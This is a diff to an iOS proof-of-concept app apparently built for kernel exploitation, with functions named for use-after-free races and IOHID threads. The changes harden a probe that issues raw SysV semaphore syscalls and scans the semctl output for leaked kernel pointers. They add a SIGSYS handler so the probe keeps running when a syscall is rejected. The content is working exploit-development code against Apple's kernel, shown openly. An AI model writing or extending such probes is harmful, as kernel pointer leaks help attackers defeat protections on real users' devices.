@@ -29,6 +29,7 @@
 #include <sys/sysctl.h>
 #include <dirent.h>
 #include <sys/stat.h>
+#include <signal.h>
 
 #if __has_include("UAFPoc-Swift.h")
 #import "UAFPoc-Swift.h"
@@ -824,7 +825,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *semConf = [UIButtonConfiguration filledButtonConfiguration];
     semConf.baseBackgroundColor = [UIColor systemPurpleColor];
     self.sysvSemButton.configuration = semConf;
-    [self.sysvSemButton setTitle:@"SysV Sem Leak Probe (v88)" forState:UIControlStateNormal];
+    [self.sysvSemButton setTitle:@"SysV Sem Leak Probe (v89)" forState:UIControlStateNormal];
     [self.sysvSemButton addTarget:self action:@selector(sysvSemTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sysvSemButton];
 
@@ -8817,11 +8818,23 @@ static void *iohid_threadCopyEvent(void *arg) {
     });
 }
 
+// Static sig_atomic_t for SIGSYS handler (must be C function compatible)
+static atomic_bool g_sigsys_fired = false;
+static void sigsys_handler(int sig) { atomic_store(&g_sigsys_fired, true); }
+
 - (void)sysvSemTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         [self appendLog:@"\n=== SysV Sem Kernel Pointer Leak Probe ==="];
 
-        // Use syscall() directly — iOS SDK lacks <sys/sem.h>
+        // Catch SIGSYS — invalid syscall numbers kill process on iOS
+        struct sigaction sa, old_sa;
+        memset(&sa, 0, sizeof(sa));
+        sa.sa_handler = sigsys_handler;
+        sigemptyset(&sa.sa_mask);
+        sa.sa_flags = 0;
+        sigaction(SIGSYS, &sa, &old_sa);
+        atomic_store(&g_sigsys_fired, false);
+
         // SysV sem syscall numbers on arm64 XNU:
         #define SYSV_SYS_semget  255
         #define SYSV_SYS_semctl  254
@@ -8833,6 +8846,12 @@ static void *iohid_threadCopyEvent(void *arg) {
         // Step 1: semget(IPC_PRIVATE, 1, 0666 | IPC_CREAT)
         int semid = (int)syscall(SYSV_SYS_semget,
             (long)SYSV_IPC_PRIVATE, (long)1, (long)(0666 | SYSV_IPC_CREAT));
+        if (atomic_load(&g_sigsys_fired)) {
+            [self appendLog:@"SIGSYS fired — SysV sem syscall not in iOS syscall table"];
+            sigaction(SIGSYS, &old_sa, NULL);
+            [self appendLog:@"=== Probe failed (syscall not available) ==="];
+            return;
+        }
         [self appendLog:[NSString stringWithFormat:
             @"semget: semid=%d errno=%d (%s)",
             semid, errno, semid < 0 ? strerror(errno) : "ok"]];
@@ -8857,6 +8876,12 @@ static void *iohid_threadCopyEvent(void *arg) {
 
         long rc = syscall(SYSV_SYS_semctl,
             (long)semid, (long)0, (long)SYSV_IPC_STAT, (long)buf);
+        if (atomic_load(&g_sigsys_fired)) {
+            [self appendLog:@"SIGSYS on semctl — syscall killed"];
+            sigaction(SIGSYS, &old_sa, NULL);
+            syscall(SYSV_SYS_semctl, (long)semid, (long)0, (long)SYSV_IPC_RMID);
+            return;
+        }
         [self appendLog:[NSString stringWithFormat:
             @"semctl(IPC_STAT): rc=%ld errno=%d (%s)",
             rc, errno, rc < 0 ? strerror(errno) : "ok"]];
@@ -8866,6 +8891,7 @@ static void *iohid_threadCopyEvent(void *arg) {
 
         if (rc < 0) {
             [self appendLog:@"=== Probe failed (semctl denied) ==="];
+            sigaction(SIGSYS, &old_sa, NULL);
             return;
         }
 
@@ -8907,6 +8933,8 @@ static void *iohid_threadCopyEvent(void *arg) {
 
         [report appendFormat:@"\nCandidates: %d\n", leakCount];
         [self appendLog:report];
+        // Restore old SIGSYS handler
+        sigaction(SIGSYS, &old_sa, NULL);
         [self appendLog:@"=== SysV Sem Probe complete ==="];
     });
 }
